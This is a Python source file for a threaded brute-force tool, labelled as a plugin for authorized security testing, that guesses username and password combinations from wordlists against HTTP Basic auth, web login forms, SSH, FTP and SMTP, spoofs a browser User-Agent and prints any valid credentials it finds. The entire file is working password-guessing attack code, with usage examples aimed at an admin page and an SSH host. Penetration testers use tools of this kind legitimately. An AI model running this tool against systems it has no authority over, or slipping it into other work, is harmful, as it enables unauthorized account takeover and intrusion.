#!/usr/bin/env python3
"""
Brute Force Authentication Testing Plugin
Multi-protocol brute force tool for authorized security testing
"""

import sys
import json
import time
import requests
import threading
import queue
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed

# Optional imports
try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False
    print("[!] paramiko not available - SSH testing disabled")

try:
    import ftplib
    FTP_AVAILABLE = True
except ImportError:
    FTP_AVAILABLE = False

try:
    import smtplib
    SMTP_AVAILABLE = True
except ImportError:
    SMTP_AVAILABLE = False


class BruteForce:
    def __init__(self, target, options=None):
        self.target = target
        self.options = options or {}

        # Configuration
        self.protocol = self.options.get('protocol', 'http').lower()
        self.username = self.options.get('username', '')
        self.username_list = self.options.get('username_list', '')
        self.password_list = self.options.get('password_list', '')
        self.threads = self.options.get('threads', 5)
        self.delay = self.options.get('delay', 0.5)
        self.timeout = self.options.get('timeout', 10)

        # HTTP Form options
        self.http_method = self.options.get('http_method', 'POST').upper()
        self.username_field = self.options.get('username_field', 'username')
        self.password_field = self.options.get('password_field', 'password')
        self.success_string = self.options.get('success_string', '')
        self.failure_string = self.options.get('failure_string', '')

        # Results
        self.results = {
            'target': self.target,
            'protocol': self.protocol,
            'successful_credentials': [],
            'stats': {
                'attempts': 0,
                'successful': 0,
                'failed': 0
            }
        }

        self.lock = threading.Lock()
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def load_wordlist(self, filepath):
        """Load wordlist from file"""
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[!] Failed to load wordlist {filepath}: {e}")
            return []

    def test_http_basic(self, username, password):
        """Test HTTP Basic Authentication"""
        try:
            response = self.session.get(
                self.target,
                auth=(username, password),
                timeout=self.timeout,
                allow_redirects=True
            )

            # 200 or 3xx usually means success
            if response.status_code in [200, 301, 302, 303]:
                # Check if we're not still on login page
                if 'login' not in response.url.lower():
                    return True

            return False

        except Exception as e:
            return False

    def test_http_form(self, username, password):
        """Test HTTP Form-based Authentication"""
        try:
            data = {
                self.username_field: username,
                self.password_field: password
            }

            if self.http_method == 'POST':
                response = self.session.post(
                    self.target,
                    data=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )
            else:
                response = self.session.get(
                    self.target,
                    params=data,
                    timeout=self.timeout,
                    allow_redirects=True
                )

            # Check for success/failure strings
            if self.success_string:
                if self.success_string in response.text:
                    return True
                return False

            if self.failure_string:
                if self.failure_string not in response.text:
                    return True
                return False

            # Fallback: check status code and URL
            if response.status_code == 200:
                # If redirected away from login, likely successful
                if 'login' not in response.url.lower() and 'login' in self.target.lower():
                    return True
                # If we see common success indicators
                if any(indicator in response.text.lower() for indicator in ['dashboard', 'welcome', 'logout', 'profile']):
                    return True

            return False

        except Exception as e:
            return False

    def test_ssh(self, username, password):
        """Test SSH Authentication"""
        if not SSH_AVAILABLE:
            return False

        try:
            # Parse host and port
            parsed = urlparse(f"ssh://{self.target}")
            host = parsed.hostname or self.target
            port = parsed.port or 22

            # Try to connect
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            ssh.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                allow_agent=False,
                look_for_keys=False
            )

            ssh.close()
            return True

        except paramiko.AuthenticationException:
            return False
        except Exception as e:
            return False

    def test_ftp(self, username, password):
        """Test FTP Authentication"""
        if not FTP_AVAILABLE:
            return False

        try:
            # Parse host and port
            parsed = urlparse(f"ftp://{self.target}")
            host = parsed.hostname or self.target
            port = parsed.port or 21

            ftp = ftplib.FTP(timeout=self.timeout)
            ftp.connect(host, port)
            ftp.login(username, password)
            ftp.quit()
            return True

        except ftplib.error_perm:
            return False
        except Exception as e:
            return False

    def test_smtp(self, username, password):
        """Test SMTP Authentication"""
        if not SMTP_AVAILABLE:
            return False

        try:
            # Parse host and port
            parsed = urlparse(f"smtp://{self.target}")
            host = parsed.hostname or self.target
            port = parsed.port or 25

            smtp = smtplib.SMTP(host, port, timeout=self.timeout)
            smtp.login(username, password)
            smtp.quit()
            return True

        except smtplib.SMTPAuthenticationError:
            return False
        except Exception as e:
            return False

    def test_credentials(self, username, password):
        """Test credentials based on protocol"""
        with self.lock:
            self.results['stats']['attempts'] += 1

        print(f"[*] Testing: {username}:{password}")

        success = False

        if self.protocol == 'http':
            success = self.test_http_basic(username, password)
        elif self.protocol == 'http-form':
            success = self.test_http_form(username, password)
        elif self.protocol == 'ssh':
            success = self.test_ssh(username, password)
        elif self.protocol == 'ftp':
            success = self.test_ftp(username, password)
        elif self.protocol == 'smtp':
            success = self.test_smtp(username, password)
        else:
            print(f"[!] Unsupported protocol: {self.protocol}")
            return False

        if success:
            with self.lock:
                self.results['stats']['successful'] += 1
                self.results['successful_credentials'].append({
                    'username': username,
                    'password': password,
                    'protocol': self.protocol
                })
            print(f"[+] SUCCESS: {username}:{password}")
        else:
            with self.lock:
                self.results['stats']['failed'] += 1

        # Delay to avoid rate limiting/lockout
        if self.delay > 0:
            time.sleep(self.delay)

        return success

    def worker(self, credentials_queue):
        """Worker thread for testing credentials"""
        while True:
            try:
                username, password = credentials_queue.get(timeout=1)
                self.test_credentials(username, password)
                credentials_queue.task_done()
            except queue.Empty:
                break
            except Exception as e:
                print(f"[!] Worker error: {e}")
                credentials_queue.task_done()

    def run(self):
        """Main execution"""
        print(f"[*] Starting brute force attack on {self.target}")
        print(f"[*] Protocol: {self.protocol}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Delay: {self.delay}s")

        # Validate protocol support
        if self.protocol == 'ssh' and not SSH_AVAILABLE:
            return {
                'error': 'SSH support requires paramiko: pip install paramiko',
                'target': self.target
            }

        # Load password list (required)
        if not self.password_list:
            return {
                'error': 'Password list is required',
                'target': self.target
            }

        passwords = self.load_wordlist(self.password_list)
        if not passwords:
            return {
                'error': 'Failed to load password list or list is empty',
                'target': self.target
            }

        print(f"[+] Loaded {len(passwords)} passwords")

        # Load usernames
        usernames = []
        if self.username:
            usernames = [self.username]
            print(f"[+] Using single username: {self.username}")
        elif self.username_list:
            usernames = self.load_wordlist(self.username_list)
            if not usernames:
                return {
                    'error': 'Failed to load username list or list is empty',
                    'target': self.target
                }
            print(f"[+] Loaded {len(usernames)} usernames")
        else:
            return {
                'error': 'Username or username_list is required',
                'target': self.target
            }

        # Create credentials queue
        credentials_queue = queue.Queue()
        for username in usernames:
            for password in passwords:
                credentials_queue.put((username, password))

        total_combinations = len(usernames) * len(passwords)
        print(f"[*] Total combinations to test: {total_combinations}")
        print(f"[*] Estimated time: {total_combinations * self.delay / self.threads / 60:.1f} minutes")

        # Start workers
        print("[*] Starting attack...")
        start_time = time.time()

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker, args=(credentials_queue,))
            t.start()
            threads.append(t)

        # Wait for completion
        for t in threads:
            t.join()

        elapsed_time = time.time() - start_time

        print(f"\n[*] Attack completed in {elapsed_time:.2f} seconds")

        self.results['stats']['elapsed_time'] = elapsed_time
        self.results['stats']['combinations_tested'] = total_combinations

        return self.results


def main(target, options=None):
    """Plugin entry point"""
    bf = BruteForce(target, options)
    results = bf.run()

    # Print summary
    print("\n" + "="*60)
    print("BRUTE FORCE SUMMARY")
    print("="*60)

    if 'error' in results:
        print(f"Error: {results['error']}")
        return results

    print(f"Target: {results['target']}")
    print(f"Protocol: {results['protocol']}")
    print(f"Total Attempts: {results['stats']['attempts']}")
    print(f"Successful: {results['stats']['successful']}")
    print(f"Failed: {results['stats']['failed']}")

    if results['stats'].get('elapsed_time'):
        print(f"Time Elapsed: {results['stats']['elapsed_time']:.2f}s")

    if results['successful_credentials']:
        print(f"\n[+] FOUND {len(results['successful_credentials'])} VALID CREDENTIALS:")
        for cred in results['successful_credentials']:
            print(f"  - {cred['username']}:{cred['password']}")

    return results


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [options_json]")
        print("\nExamples:")
        print(f"  # HTTP Basic Auth")
        print(f"  {sys.argv[0]} https://example.com/admin \\")
        print(f"    '{{\"protocol\": \"http\", \"username\": \"admin\", \"password_list\": \"passwords.txt\"}}'")
        print(f"\n  # HTTP Form")
        print(f"  {sys.argv[0]} https://example.com/login \\")
        print(f"    '{{\"protocol\": \"http-form\", \"username\": \"admin\", \"password_list\": \"passwords.txt\", \"success_string\": \"Welcome\"}}'")
        print(f"\n  # SSH")
        print(f"  {sys.argv[0]} 192.168.1.100 \\")
        print(f"    '{{\"protocol\": \"ssh\", \"username_list\": \"users.txt\", \"password_list\": \"passwords.txt\"}}'")
        sys.exit(1)

    target = sys.argv[1]
    options = None

    if len(sys.argv) > 2:
        try:
            options = json.loads(sys.argv[2])
        except:
            print("[!] Invalid JSON options")
            sys.exit(1)

    result = main(target, options)
    print("\n" + json.dumps(result, indent=2))
